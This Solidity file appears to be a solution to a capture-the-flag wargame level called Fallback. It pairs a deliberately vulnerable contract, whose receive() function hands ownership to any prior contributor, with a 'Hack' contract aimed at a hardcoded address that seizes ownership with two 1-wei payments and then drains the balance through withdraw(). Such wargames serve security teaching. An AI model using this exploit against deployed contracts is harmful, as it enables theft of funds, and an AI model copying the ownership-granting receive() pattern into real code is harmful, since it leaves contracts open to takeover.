// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
 
contract Hack {
    address payable target = payable(0x0D82eD8db37DA41CA5e0370C1C321c9b816Baff2);
    Fallback fb = Fallback(target);


    function attack() public payable {
        fb.contribute{value:1 wei}();
        (bool success, ) = target.call{value: 1 wei}(""); // fallback
        require(success, "Fallback call failed");
        require(fb.owner() == address(this), "Hack is not the owner!");
        fb.withdraw();
    }

    function getContribution() public view returns(uint256){
        return fb.getContribution();
    }
    function getOwner() public view returns(address){
        return fb.owner();
    }

    receive() external payable {}
}